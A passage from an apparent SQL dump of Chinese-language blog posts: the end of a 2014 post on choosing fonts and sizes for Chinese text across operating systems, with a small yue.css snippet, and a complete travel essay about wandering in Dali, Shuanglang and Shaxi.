的字體渲染優勢。我們看到中易宋體的內容非常清晰悅目。</p>\n<figure><img alt="中易宋體" src="http://dn-lepture.qbox.me/blog/18px-win-simsun.png" /><figcaption>Windows 上 18px 的中易宋體</figcaption></figure><p>但是受限於點陣字體，一旦到 18px 時，渲染效果就沒法看了。所以使用中易宋體時就必須保證字體大小在 18px 以下。</p>\n<p>那麼，在 Windows 上，我的選擇是 16px 的中易宋體。但是我並非實際使用者，有 Windows 使用者反饋說微軟雅黑挺好的。還是希望能有更多的 Windows 使用者的反饋。</p>\n<h2>Linux</h2>\n<p>在使用 Mac 之前，我一直使用的是 Ubuntu，所有的經驗也都停留在那一時期。也不知道過了這許多年，Linux 上的字體渲染發展得如何了。</p>\n<p>Linux 上我的選擇是 18px 的 <del>文泉驛微米黑</del> Droid Sans Fallback。因爲 Linux 用戶自己喜歡折騰，我的選擇也許無關痛癢。</p>\n<h2>The Code</h2>\n<p>這些經驗最終彙集到了 <a href="https://github.com/lepture/yue.css">yue.css</a> 這個樣式庫。尤其是對 Windows 的處理，反反覆覆，時而會把微軟雅黑添加進來，時而又移出。到寫作此文時，字體樣式便成了：</p>\n<pre><code class="lang-css">.yue {\n  font: 400 18px/1.62 &quot;Georgia&quot;, &quot;Xin Gothic&quot;, &quot;Hiragino Sans GB&quot;, &quot;Droid Sans Fallback&quot;, &quot;Microsoft YaHei&quot;, sans-serif;\n}\n.windows .yue {\n  font-size: 16px;\n  font-family: &quot;Georgia&quot;, &quot;SimSun&quot;, sans-serif;\n}</code></pre>\n<p>Windows 使用 16px 是爲了兼容 Windows XP。在 XP 上，沒有微軟雅黑只有中易宋體，在這種情況下會 Fallback 到中易宋體，而 18px 會導致字體變形。你可能需要一句 JavaScript 來添加 <code>.windows</code> 的 class：</p>\n<pre><code class="lang-javascript">if(/windows/i.test(navigator.userAgent)){\n  document.getElementsByTagName(''html'')[0].className += '' windows''\n}</code></pre>\n<p>至於 16px，我個人以爲偏小。但是還有許多網站在使用 14px，甚至於還有 12px 的。以現在顯示器的分辨率，14px 的文字閱讀起來就有點吃力了。當然，也有可能我高估了高分屏的普及率了。</p>\n<h2>Criticism</h2>\n<ol>\n<li>豆瓣的日誌影評書評等內容皆是 12px 的，必須點名批評一下。現在已經是 2014 年了，這個字體大小真的看起來很累。</li>\n<li>知乎的內容是 13px 的，比起 12px 也好不了多少。不過專欄字體大小有 16px 了，還算不錯。</li>\n<li>簡書用 18px 的宋體，這個在 Windows 下是沒有辦法忍受的。但是最不能忍受的還是楷體的標題。</li>\n</ol>\n<h2>yue.css</h2>\n<p>對於文字排版，我並沒有專業的素養。愚之所言，不過個人經驗罷了。最後這些經驗彙集成了樣式集 <a href="https://github.com/lepture/yue.css">yue.css</a>。</p>\n<p>yue.css 不是一個樣式重置(reset)，不會影響到其它標籤的樣式。你所需要的只是給內容區域加上 <code>.yue</code> 的 class。簡潔實用，目前用於我的博客，<a href="https://yuehu.io/">閱乎</a>，當然還有別的朋友在用。</p>\n<p>如果你對文字排版有興趣，可以使用 yue.css。如果你對 yue.css 有意見，也歡迎反饋給我。</p>\n<hr />\n<p>注：本文只關注字體，稍微關注大小，但是賞心的文字排版還包括行高顏色等。</p>', '2014-11-06 23:42:49', 5, '2014-05-09 07:35:00', '2014-05-09 07:35:00', 0, '[["\\u5b8b\\u9ad4", 0.3361621793434095], ["Windows", 0.3361621793434095], ["\\u5b57\\u9ad4", 0.3151520431344464], ["18px", 0.21010136208963093], ["\\u4e2d\\u6613", 0.19557274041652023], ["\\u9ed1\\u9ad4", 0.18909122588066782], ["Mac", 0.18909122588066782], ["yue", 0.18909122588066782], ["\\u5fae\\u8edf\\u96c5", 0.16808108967170474], ["16px", 0.14707095346274165], ["\\u6a23\\u5f0f", 0.12606081725377855], ["\\u9078\\u64c7", 0.12606081725377855], ["css", 0.12606081725377855], ["\\u6211\\u500b", 0.10505068104481546], ["\\u6e32\\u67d3", 0.09319595028769773], ["\\u51ac\\u9752", 0.09226256828031633], ["\\u535a\\u5ba2", 0.08883178312871705], ["Linux", 0.08404054483585237], ["\\u986f\\u793a\\u5668", 0.08404054483585237], ["Sans", 0.08404054483585237]]', NULL, NULL, '我時常更新自己的博客程序，也時常更新自己的博客主題。偏右言：「世上有兩種前端工程師，寫博客的，和寫博客的。」我之謂也。我的博客主題一直保持着簡潔的樣式，保持着我認爲適合閱讀的文字排版。\n中文閱讀上，我以爲最大的問題便是字體。不像英文，使用 Web Fonts 的代價相當低廉，中文因爲文字量大的原因，整個字體文件偏大，暫不適合使用 Web Fonts。在這樣的情形下，我們只能儘量利用作業系統自身的字體了。\nMac\nMac 上默認的中文字體是華文黑體（STHeiti）與華文宋體，我個人認爲質量是不錯的。紙質書的印刷，普遍使用的是宋體，然而在現在的顯示器上，宋體的表現並不令人滿意。\n宋體的結構相比於黑體要複雜許多，比如橫線起筆處微小的回鉤，橫豎撇捺點鉤都沒有那麼簡單。這些細膩的處理在現在的顯示器上都無法完美地體現，也許等到 Retina 普及後，宋體才能重拾其在紙質書的光輝。\n而黑體則不一樣，結構簡潔，形體勻稱，合適在顯示器上閱讀。所以目前我的選擇是黑體。Mac 上還有一款讚譽頗多的黑體，冬青黑體（Hiragino Sans GB）。\nMac 上 18px 的華文黑體Mac 上 18px 的冬青黑體我個人以爲兩者都還不錯，冬青黑體整體看來更爲飽滿，偏扁平，而華文黑體則偏瘦一點，比如你看兩者的「口」字。我個人隨大流，選擇了讚譽頗多的冬青黑體。\nWindows\n因爲我個人一直使用的是 Mac，對視窗系統沒有太多了解，只知道中易宋體與微軟雅黑。所以只能對這兩者做對比。\nWindows 上 18px 的微軟雅黑也許只是個人原因，微軟雅黑看起來不夠圓潤，甚至有鋸齒感。當然，這與 Windows 的字體渲染有關，非微軟雅黑字體之過。但是也有人覺得 Windows 上的微軟雅黑比 Mac 上的冬青黑體更好，嫌棄 Mac 的字體渲染太模糊。我個人認爲 16px 的中易宋體在 Windows 上是更好的選擇。\nWindows 上 16px 的中易宋體Windows 的字體渲染偏銳利，微軟雅黑的顯示就有點尷尬，但是中易宋體是點陣字體，正好利用到了 Windows 的字體渲染優勢。我們看到中易宋體的內容非常清晰悅目。\nWindows 上 18px 的中易宋體但是受限於點陣字體，一旦到 18px 時，渲染效果就沒法看了。所以使用中易宋體時就必須保證字體大小在 18px 以下。\n那麼，在 Windows 上，我的選擇是 16px 的中易宋體。但是我並非實際使用者，有 Windows 使用者反饋說微軟雅黑挺好的。還是希望能有更多的 Windows 使用者的反饋。\nLinux\n在使用 Mac 之前，我一直使用的是 Ubuntu，所有的經驗也都停留在那一時期。也不知道過了這許多年，Linux 上的字體渲染發展得如何了。\nLinux 上我的選擇是 18px 的 文泉驛微米黑 Droid Sans Fallback。因爲 Linux 用戶自己喜歡折騰，我的選擇也許無關痛癢。\nThe Code\n這些經驗最終彙集到了 yue.css 這個樣式庫。尤其是對 Windows 的處理，反反覆覆，時而會把微軟雅黑添加進來，時而又移出。到寫作此文時，字體樣式便成了：\n.yue {\n  font: 400 18px/1.62 "Georgia", "Xin Gothic", "Hiragino Sans GB", "Droid Sans Fallback", "Microsoft YaHei", sans-serif;\n}\n.windows .yue {\n  font-size: 16px;\n  font-family: "Georgia", "SimSun", sans-serif;\n}\nWindows 使用 16px 是爲了兼容 Windows XP。在 XP 上，沒有微軟雅黑只有中易宋體，在這種情況下會 Fallback 到中易宋體，而 18px 會導致字體變形。你可能需要一句 JavaScript 來添加 .windows 的 class：\nif(/windows/i.test(navigator.userAgent)){\n  document.getElementsByTagName(''html'')[0].className += '' windows''\n}\n至於 16px，我個人以爲偏小。但是還有許多網站在使用 14px，甚至於還有 12px 的。以現在顯示器的分辨率，14px 的文字閱讀起來就有點吃力了。當然，也有可能我高估了高分屏的普及率了。\nCriticism\n\n豆瓣的日誌影評書評等內容皆是 12px 的，必須點名批評一下。現在已經是 2014 年了，這個字體大小真的看起來很累。\n知乎的內容是 13px 的，比起 12px 也好不了多少。不過專欄字體大小有 16px 了，還算不錯。\n簡書用 18px 的宋體，這個在 Windows 下是沒有辦法忍受的。但是最不能忍受的還是楷體的標題。\n\nyue.css\n對於文字排版，我並沒有專業的素養。愚之所言，不過個人經驗罷了。最後這些經驗彙集成了樣式集 yue.css。\nyue.css 不是一個樣式重置(reset)，不會影響到其它標籤的樣式。你所需要的只是給內容區域加上 .yue 的 class。簡潔實用，目前用於我的博客，閱乎，當然還有別的朋友在用。\n如果你對文字排版有興趣，可以使用 yue.css。如果你對 yue.css 有意見，也歡迎反饋給我。\n\n注：本文只關注字體，稍微關注大小，但是賞心的文字排版還包括行高顏色等。', NULL, NULL, NULL),
(31, 'http://lepture.com/zh/2014/wander-in-dali', '沒有時間的大理', '<p>大理古城閒步時，偶爾與人搭話，被問及「何時來大理」又「打算呆多久」時，我總是輕描一句「忘記了」又或者「不知道」。假使不刻意去想想的話，還真無法可知。譬如我是什麼時候離開昆明的，如果沒有 <a href="http://lepture.com/zh/2014/a-trip-in-kunming">昆明的遊記</a> 在這裏，也許是真的想不起來了。</p>\n<p>在大理，時間是一件挺無關緊要的事物，只在這催人前行催人寫下一篇遊記的時刻才顯得實實在在。更多的時候，時間被人遺忘，留下的是如畫風景，是過往人事。</p>\n<p>大理最有名的是洱海與蒼山，有蒼洱一日遊的旅遊線路。我從來沒有想過要跟團旅遊，可是在第二日便跟團出遊了，結果意外地感覺不錯，拍了幾張還滿意的照片，因爲不擅長又懶於後期處理，只隨便整理了幾張洱海風景。</p>\n<figure><img alt="洱海與遠山" src="http://dn-lepture.qbox.me/blog/pure-erhai.jpg/thumbnail" /><figcaption>洱海與遠山 by Epl-5</figcaption></figure><figure><img alt="洱海與村落" src="http://dn-lepture.qbox.me/blog/erhai-and-vallige.jpg/thumbnail" /><figcaption>洱海與村落 by Epl-5</figcaption></figure><figure><img alt="洱海" src="http://dn-lepture.qbox.me/blog/erhai-and-border.jpg/thumbnail" /><figcaption>洱海 by Epl-5</figcaption></figure><p>還有蒼山遠眺的風景。乘纜車上蒼山，入天龍洞，拾級而上，一路行人各處留影。洞中光線不好，小彩燈的點綴並不適合拍照，而遊客相機不停，只管留下「到此一遊」的足跡。待得出洞後，心胸頓時開闊，遠眺山下洱海，斜入洱海的幾爿地，遍布白牆青瓦的村子又或者鬱鬱蔥蔥的田地。洱海對面的羣山躺在白雲遮蔽的陰影裏，近處是土黃的未有種植的格子田，田邊又是這白牆青瓦的村落橫躺在國道旁。</p>\n<hr />\n<p>蒼洱一日遊有三條線，我們這條是民俗線，是同住的三個妹子的朋友幫忙訂的。她們一行與我同日到大理，我們是在下關到大理古城的公車上認識的。到古城時，天色已經黑，我陪她們找客棧入住。她們已經預訂好了一家，叫「石門客棧」，可是無論百度地圖亦或高德地圖，循着地圖走到目的地總是撲個空。而且「石門客棧」的電話又打不通，我們傾向於認爲這家客棧是不存在的，最後只好放棄，隨處找找，選定了人民路上段與博愛路相交處的「大熊餐吧（杭州人家）」。</p>\n<p>這條線路整體感覺還行<sup class="footnote-ref" id="fnref-1"><a href="http://lepture.com/#fn-1" rel="footnote">1</a></sup>，中途有兩個購物點，一是玉器，一是銀器。早晨十點出發，下午六點回城。一路上介紹白族特色，講大理是「男人的天堂，女人的天下」，講大理的「風花雪月」<sup class="footnote-ref" id="fnref-2"><a href="http://lepture.com/#fn-2" rel="footnote">2</a></sup>。導遊是白族人，戴一環扁平的銀手鐲，喜歡用一些驚人的詞彙，比如「刁民」指「雕民」，比如「嫖客」指「漂客」。白族民居同漢族民居頗不相同，是坐南朝北，進門有一屏白壁，白壁鉓以水墨畫，大約因爲日照過甚，只以這白壁反光照亮堂室。</p>\n<p>旅途中下過水，上過山，賞過秀，品過茶。到得旅程結束，在古城裏見到了她們另一羣朋友，抱着在路上撿到的小狗，給這小狗找主人呢。幫我們訂票的朋友也在，叫高翔，又煩他陪我們去買褲子。在護國路上段一家白族人那裏買的，洋人街與人民路這邊的攤鋪始終砍不下價錢。賣衣服的「金花」打趣高翔，問靖雅是不是他女朋友。結果深夜遊玩結束，回到就寝處便發生了尷尬的表白事件。</p>\n<hr />\n<p>這一路與許多人聊過天，比如擺攤賣明信片的，他讀工科，畢業後就不曾工作，一直在路上，自己拍點照片印成明信片來賣，據說也有日入千圓的經歷，我也光顧了他一下，給朋友寄去的明信片便是在他這兒買的。他也偶爾幫人拍拍寫真。像今天，他身邊便有個姑娘，大約等到下午些時候便要去拍寫真。</p>\n<figure><img alt="我在大理" src="http://dn-lepture.qbox.me/blog/me-with-postcards.jpg/thumbnail" /><figcaption>走在寄明信片的路上 by iPhone</figcaption></figure><p>比如走在路上，被擺地攤賣襪子的姑娘叫住，說是認識我，之前在 <a href="http://lepture.com/zh/2014/a-trip-in-kunming">昆明傾城青年旅舍</a> 和他們打過招呼。他們男女朋友一起辭職出來玩，一邊又擺攤賣點東西，賺點旅費。我便坐下與他們聊聊天。到收攤時，問他們住在哪裏，結果竟然是我們不曾找到的「石門客棧」。我隨後便同他們去這客棧瞧瞧，這個時候曉霞、靖雅、小巧她們已經離開古城了。</p>\n<p>在客棧處又意外地遇到的拍寫真的姑娘，也遇到了後來一起去雙廊的凌雲與阿友。客棧老闆是 90 後，和我一樣是湖北人。客棧地理位置特別偏僻，已經出了古城，與地圖上的位置風牛馬不相及，網上預訂需慎重啊。因爲便宜，隔天我也搬了過來住，還順帶了一個小伙。</p>\n<p>我們是在早點鋪子裏認識的，他昨天剛到大理，現在已經準備離開了，覺得大理不好玩。我同他聊了聊，講大理的好，講風景，講人物，講擺攤的人，講有意思的店鋪，講大理不能急要細細品味。結果他便留了下來，隨我去住了便宜的床位，這一住下來就住了好幾天，到我離開古城時，他還沒有離開大理。</p>\n<p>他帶我去一家木制玩具店玩。這家店在人民路上，據說洋人街也有。各式木制玩具，許多是拼圖類的，還有華容道，可以免費試玩。我們玩得倒是不亦樂乎，後來還假裝店員，幫忙推銷——「這款是我們店賣得最好的，只要八十六，你可以搭配這款一起，買兩個可以九折」。</p>\n<hr />\n<p>中午的時候，我們去博愛路南端的一然堂吃齋飯。一然堂 5 圓一人隨便吃，但是不能剩飯剩菜。一然堂是佛門之地，我們一邊吃素，一邊看講經的電視。淨空法師講道：「佛不是神仙，他是人，佛只是一種學位，佛好比是博士，菩薩是碩士，阿修羅是學士。」<sup class="footnote-ref" id="fnref-3"><a href="http://lepture.com/#fn-3" rel="footnote">3</a></sup>他又講：「佛的學位叫無上正等正覺。」淨空法師講得通俗易懂，觀念又貼近生活，挺有意思的。</p>\n<p>後來又隨同客棧的朋友一起去慈緣齋素食館吃飯，這家素食館就更有趣了，是完全免費的，隨便吃，也是不能剩飯剩菜，吃完歸還餐盤就可以走了，而且這裏的飯菜比一然堂味道更好。沿着博愛路往南走，出了偏南門，擡頭便能見到。他們家也放電視，有不同的人講經，我們看的還是淨空法師，但是內容是《了凡四訓》。</p>\n<hr />\n<figure><img alt="雙廊的洱海" src="http://dn-lepture.qbox.me/blog/shuanglang-erhai.jpg/thumbnail" /><figcaption>雙廊的洱海 by Epl-5</figcaption></figure><p>洱海一圈遍布着古村古鎮，比如說喜州，比如說雙廊。剛好同住的朋友要去雙廊，我便隨他們一起去了。跳過了不少地方，頗爲可惜。我們是申時出發的，將到雙廊時，正是落日時分，只能在車上瞟一眼日落，等到下車時，太陽已經隱沒在蒼山裏了。</p>\n<p>可是並沒有什麼可惜的，因爲隔天便又見落日了。在暖暖客棧後山遠觀夕陽一點點落下，直到藏身於對面的蒼山。夕陽染醉了山邊的雲層，涂一沫酡紅的酒暈，也染醉了我們，我們像一羣醉酒的人，神經病似地唱着各種各樣的歌。抒情的，戀愛的，勵志的。等到天色已暗，習習涼風，忍不住打個寒噤時才肯罷休。</p>\n<p>我們入住的這家暖暖客棧風評不錯，是凌雲帶我們來的，也不清楚她是怎麼知道的。店員妹子們人都特別好，又漂亮又可愛。如果球技不佳，不要和小希打桌球，可以找小向練練手，但是假如你是個高手，記得找老闆瓜哥來一局，也許就免房費了。午餐可以在暖暖搭伙，假使你很能吃的話，也可以挑戰一下五碗飯，興許也免房費了。</p>\n<p>途次雙廊，更多的時候是在客棧度過的。因爲雙廊在修建各種房屋，路上散着一堆堆的泥沙，而且多是小巷，行路多有不便，所以只隨便走了走。在客棧打打桌球，玩玩牌，晚上的時候玩「殺人」，一直玩到一兩點。認識了一起去瀘沽湖的朋友，TiTi、春天、阿布還有一起過來的阿友。</p>\n<p>格格總不加入我們的遊戲，一直在牆角的木桌安靜地畫畫。她有個小本子，打算在暖暖做義工期間畫滿整個本子。最近她在做「精緻手繪明信片義賣」，鉛筆畫的各式圖案，搭配一枚鳥羽，文藝極了，有點「千里送鵝毛的意思」。</p>\n<figure><img alt="格格畫的明信片" src="http://dn-lepture.qbox.me/blog/postcards-by-gege.jpg/thumbnail" /><figcaption>格格畫的明信片 from WeChat Moments</figcaption></figure><p>因爲人暖，在暖暖度過了暖暖的時光，離開的時候，是小樣的生日，於是又多留了一日。燭光中的小樣閉眼許願，大家唱着生日歌，畫面定格，手機相機閃爍，留下這一時刻。</p>\n<hr />\n<p>從瀘沽湖回來，返程回古城前又去了一趟沙溪，可惜時日不多。沙溪是一個適合長住的地方，浮光掠影的一瞥享受不了那份安逸。</p>\n<p>沙溪號稱是茶馬古道唯一倖存的古集市，古鎮很小，遊客多集中在有「千年集市」之譽的寺登街。有一條溪流，沿着寺登街，一路淌下來，也許這便是沙溪。這裏外國人尤其多，經營咖啡館小飯店的多非本地人。古鎮一圈繞着多處村莊，閒暇時一個人跑到村子裏去玩了玩，聽當地老人們的聊天。</p>\n<p>雖然是小住，卻幸運地遇到了週五的集市。街道兩邊遍佈着攤鋪，賣早點的，賣菜的，賣水果的，賣衣服的。街市上的人背着竹簍子走來走去，尋覓着，還有像我這樣的看客無聊地晃荡着。集市上遇着一位外國小夥，也背着竹簍來趕集，身邊是當地的老奶奶，他已在村子裏的「奶奶」家住了一個月了。</p>\n<p>早餐在集市吃了份豌豆涼粉，挺美味的，當地人都會買一大份回家當菜吃。可惜時間催人，中午便要離開了。</p>\n<hr />\n<p>一路過來，最喜歡的還是大理。真羨慕奚媛妹子，住在了這樣一個山青水秀人傑地靈的地方。在大理的時光，還要感謝奚媛帶我去吃當地美食，又煩她一起爬山，去桃溪谷探探山泉，回三文筆茶場的莫催茶室喝茶。</p>\n<p>品着茶，從半山腰的茶室遠眺洱海蒼山，遠眺山下大理，觀茶室姑娘練毛筆字，練蘇軾的《赤壁賦》，生活多麼愜意。多想留在大理住下，可惜我不是歸人，是個過客。</p>\n<div class="footnotes">\n<hr />\n<ol><li id="fn-1"><p>因爲沒有跟團的經歷，沒有比較，只是個人感覺。<a href="http://lepture.com/#fnref-1" rev="footnote">&#8617;</a></p></li>\n<li id="fn-2"><p>下关风，上关花，苍山雪，洱海月。<a href="http://lepture.com/#fnref-2" rev="footnote">&#8617;</a></p></li>\n<li id="fn-3"><p>那個時候我還不知道淨空法師，是 <a href="https://twitter.com/mathena/status/453141498993733632">徐宥告訴我的</a>。<a href="http://lepture.com/#fnref-3" rev="footnote">&#8617;</a></p></li>\n</ol>\n</div>', '2014-11-06 23:42:49', 5, '2014-04-29 11:26:00', '2014-04-29 11:26:00', 0, '[["\\u6211\\u5011", 0.21714007573380423], ["\\u5927\\u7406", 0.14367186692056508], ["\\u5ba2\\u68e7", 0.13269671294843594], ["\\u6d31\\u6d77", 0.12095242760706357], ["\\u6642\\u5019", 0.09650670032613522], ["\\u96d9\\u5eca", 0.08444336278536832], ["\\u96e2\\u958b", 0.07238002524460141], ["\\u84bc\\u5c71", 0.07238002524460141], ["\\u660e\\u4fe1\\u7247", 0.06633444201493441], ["\\u4ed6\\u5011", 0.06031668770383451], ["\\u4e00\\u500b", 0.06031668770383451], ["\\u53e4\\u57ce", 0.05989183065751766], ["\\u8def\\u4e0a", 0.05072379284238143], ["\\u7576\\u5730", 0.04825335016306761], ["\\u4e00\\u7136\\u5802", 0.04825335016306761], ["\\u8a8d\\u8b58", 0.04825335016306761], ["\\u9084\\u6709", 0.04825335016306761], ["\\u7d50\\u679c", 0.04825335016306761], ["\\u9060\\u773a", 0.04825335016306761], ["\\u96a8\\u4fbf", 0.04825335016306761]]', NULL, NULL, '大理古城閒步時，偶爾與人搭話，被問及「何時來大理」又「打算呆多久」時，我總是輕描一句「忘記了」又或者「不知道」。假使不刻意去想想的話，還真無法可知。譬如我是什麼時候離開昆明的，如果沒有 昆明的遊記 在這裏，也許是真的想不起來了。\n在大理，時間是一件挺無關緊要的事物，只在這催人前行催人寫下一篇遊記的時刻才顯得實實在在。更多的時候，時間被人遺忘，留下的是如畫風景，是過往人事。\n大理最有名的是洱海與蒼山，有蒼洱一日遊的旅遊線路。我從來沒有想過要跟團旅遊，可是在第二日便跟團出遊了，結果意外地感覺不錯，拍了幾張還滿意的照片，因爲不擅長又懶於後期處理，只隨便整理了幾張洱海風景。\n洱海與遠山 by Epl-5洱海與村落 by Epl-5洱海 by Epl-5還有蒼山遠眺的風景。乘纜車上蒼山，入天龍洞，拾級而上，一路行人各處留影。洞中光線不好，小彩燈的點綴並不適合拍照，而遊客相機不停，只管留下「到此一遊」的足跡。待得出洞後，心胸頓時開闊，遠眺山下洱海，斜入洱海的幾爿地，遍布白牆青瓦的村子又或者鬱鬱蔥蔥的田地。洱海對面的羣山躺在白雲遮蔽的陰影裏，近處是土黃的未有種植的格子田，田邊又是這白牆青瓦的村落橫躺在國道旁。\n\n蒼洱一日遊有三條線，我們這條是民俗線，是同住的三個妹子的朋友幫忙訂的。她們一行與我同日到大理，我們是在下關到大理古城的公車上認識的。到古城時，天色已經黑，我陪她們找客棧入住。她們已經預訂好了一家，叫「石門客棧」，可是無論百度地圖亦或高德地圖，循着地圖走到目的地總是撲個空。而且「石門客棧」的電話又打不通，我們傾向於認爲這家客棧是不存在的，最後只好放棄，隨處找找，選定了人民路上段與博愛路相交處的「大熊餐吧（杭州人家）」。\n這條線路整體感覺還行1，中途有兩個購物點，一是玉器，一是銀器。早晨十點出發，下午六點回城。一路上介紹白族特色，講大理是「男人的天堂，女人的天下」，講大理的「風花雪月」2。導遊是白族人，戴一環扁平的銀手鐲，喜歡用一些驚人的詞彙，比如「刁民」指「雕民」，比如「嫖客」指「漂客」。白族民居同漢族民居頗不相同，是坐南朝北，進門有一屏白壁，白壁鉓以水墨畫，大約因爲日照過甚，只以這白壁反光照亮堂室。\n旅途中下過水，上過山，賞過秀，品過茶。到得旅程結束，在古城裏見到了她們另一羣朋友，抱着在路上撿到的小狗，給這小狗找主人呢。幫我們訂票的朋友也在，叫高翔，又煩他陪我們去買褲子。在護國路上段一家白族人那裏買的，洋人街與人民路這邊的攤鋪始終砍不下價錢。賣衣服的「金花」打趣高翔，問靖雅是不是他女朋友。結果深夜遊玩結束，回到就寝處便發生了尷尬的表白事件。\n\n這一路與許多人聊過天，比如擺攤賣明信片的，他讀工科，畢業後就不曾工作，一直在路上，自己拍點照片印成明信片來賣，據說也有日入千圓的經歷，我也光顧了他一下，給朋友寄去的明信片便是在他這兒買的。他也偶爾幫人拍拍寫真。像今天，他身邊便有個姑娘，大約等到下午些時候便要去拍寫真。\n走在寄明信片的路上 by iPhone比如走在路上，被擺地攤賣襪子的姑娘叫住，說是認識我，之前在 昆明傾城青年旅舍 和他們打過招呼。他們男女朋友一起辭職出來玩，一邊又擺攤賣點東西，賺點旅費。我便坐下與他們聊聊天。到收攤時，問他們住在哪裏，結果竟然是我們不曾找到的「石門客棧」。我隨後便同他們去這客棧瞧瞧，這個時候曉霞、靖雅、小巧她們已經離開古城了。\n在客棧處又意外地遇到的拍寫真的姑娘，也遇到了後來一起去雙廊的凌雲與阿友。客棧老闆是 90 後，和我一樣是湖北人。客棧地理位置特別偏僻，已經出了古城，與地圖上的位置風牛馬不相及，網上預訂需慎重啊。因爲便宜，隔天我也搬了過來住，還順帶了一個小伙。\n我們是在早點鋪子裏認識的，他昨天剛到大理，現在已經準備離開了，覺得大理不好玩。我同他聊了聊，講大理的好，講風景，講人物，講擺攤的人，講有意思的店鋪，講大理不能急要細細品味。結果他便留了下來，隨我去住了便宜的床位，這一住下來就住了好幾天，到我離開古城時，他還沒有離開大理。\n他帶我去一家木制玩具店玩。這家店在人民路上，據說洋人街也有。各式木制玩具，許多是拼圖類的，還有華容道，可以免費試玩。我們玩得倒是不亦樂乎，後來還假裝店員，幫忙推銷——「這款是我們店賣得最好的，只要八十六，你可以搭配這款一起，買兩個可以九折」。\n\n中午的時候，我們去博愛路南端的一然堂吃齋飯。一然堂 5 圓一人隨便吃，但是不能剩飯剩菜。一然堂是佛門之地，我們一邊吃素，一邊看講經的電視。淨空法師講道：「佛不是神仙，他是人，佛只是一種學位，佛好比是博士，菩薩是碩士，阿修羅是學士。」3他又講：「佛的學位叫無上正等正覺。」淨空法師講得通俗易懂，觀念又貼近生活，挺有意思的。\n後來又隨同客棧的朋友一起去慈緣齋素食館吃飯，這家素食館就更有趣了，是完全免費的，隨便吃，也是不能剩飯剩菜，吃完歸還餐盤就可以走了，而且這裏的飯菜比一然堂味道更好。沿着博愛路往南走，出了偏南門，擡頭便能見到。他們家也放電視，有不同的人講經，我們看的還是淨空法師，但是內容是《了凡四訓》。\n\n雙廊的洱海 by Epl-5洱海一圈遍布着古村古鎮，比如說喜州，比如說雙廊。剛好同住的朋友要去雙廊，我便隨他們一起去了。跳過了不少地方，頗爲可惜。我們是申時出發的，將到雙廊時，正是落日時分，只能在車上瞟一眼日落，等到下車時，太陽已經隱沒在蒼山裏了。\n可是並沒有什麼可惜的，因爲隔天便又見落日了。在暖暖客棧後山遠觀夕陽一點點落下，直到藏身於對面的蒼山。夕陽染醉了山邊的雲層，涂一沫酡紅的酒暈，也染醉了我們，我們像一羣醉酒的人，神經病似地唱着各種各樣的歌。抒情的，戀愛的，勵志的。等到天色已暗，習習涼風，忍不住打個寒噤時才肯罷休。\n我們入住的這家暖暖客棧風評不錯，是凌雲帶我們來的，也不清楚她是怎麼知道的。店員妹子們人都特別好，又漂亮又可愛。如果球技不佳，不要和小希打桌球，可以找小向練練手，但是假如你是個高手，記得找老闆瓜哥來一局，也許就免房費了。午餐可以在暖暖搭伙，假使你很能吃的話，也可以挑戰一下五碗飯，興許也免房費了。\n途次雙廊，更多的時候是在客棧度過的。因爲雙廊在修建各種房屋，路上散着一堆堆的泥沙，而且多是小巷，行路多有不便，所以只隨便走了走。在客棧打打桌球，玩玩牌，晚上的時候玩「殺人」，一直玩到一兩點。認識了一起去瀘沽湖的朋友，TiTi、春天、阿布還有一起過來的阿友。\n格格總不加入我們的遊戲，一直在牆角的木桌安靜地畫畫。她有個小本子，打算在暖暖做義工期間畫滿整個本子。最近她在做「精緻手繪明信片義賣」，鉛筆畫的各式圖案，搭配一枚鳥羽，文藝極了，有點「千里送鵝毛的意思」。\n格格畫的明信片 from WeChat Moments因爲人暖，在暖暖度過了暖暖的時光，離開的時候，是小樣的生日，於是又多留了一日。燭光中的小樣閉眼許願，大家唱着生日歌，畫面定格，手機相機閃爍，留下這一時刻。\n\n從瀘沽湖回來，返程回古城前又去了一趟沙溪，可惜時日不多。沙溪是一個適合長住的地方，浮光掠影的一瞥享受不了那份安逸。\n沙溪號稱是茶馬古道唯一倖存的古集市，古鎮很小，遊客多集中在有「千年集市」之譽的寺登街。有一條溪流，沿着寺登街，一路淌下來，也許這便是沙溪。這裏外國人尤其多，經營咖啡館小飯店的多非本地人。古鎮一圈繞着多處村莊，閒暇時一個人跑到村子裏去玩了玩，聽當地老人們的聊天。\n雖然是小住，卻幸運地遇到了週五的集市。街道兩邊遍佈着攤鋪，賣早點的，賣菜的，賣水果的，賣衣服的。街市上的人背着竹簍子走來走去，尋覓着，還有像我這樣的看客無聊地晃荡着。集市上遇着一位外國小夥，也背着竹簍來趕集，身邊是當地的老奶奶，他已在村子裏的「奶奶」家住了一個月了。\n早餐在集市吃了份豌豆涼粉，挺美味的，當地人都會買一大份回家當菜吃。可惜時間催人，中午便要離開了。\n\n一路過來，最喜歡的還是大理。真羨慕奚媛妹子，住在了這樣一個山青水秀人傑地靈的地方。在大理的時光，還要感謝奚媛帶我去吃當地美食，又煩她一起爬山，去桃溪谷探探山泉，回三文筆茶場的莫催茶室喝茶。\n品着茶，從半山腰的茶室遠眺洱海蒼山，遠眺山下大理，觀茶室姑娘練毛筆字，練蘇軾的《赤壁賦》，生活多麼愜意。多想留在大理住下，可惜我不是歸人，是個過客。\n\n\n因爲沒有跟團的經歷，沒有比較，只是個人感覺。↩\n下关风，上关花，苍山雪，洱海月。↩\n那個時候我還不知道淨空法師，是 徐宥告訴我的。↩\n\n', NULL, NULL, NULL),
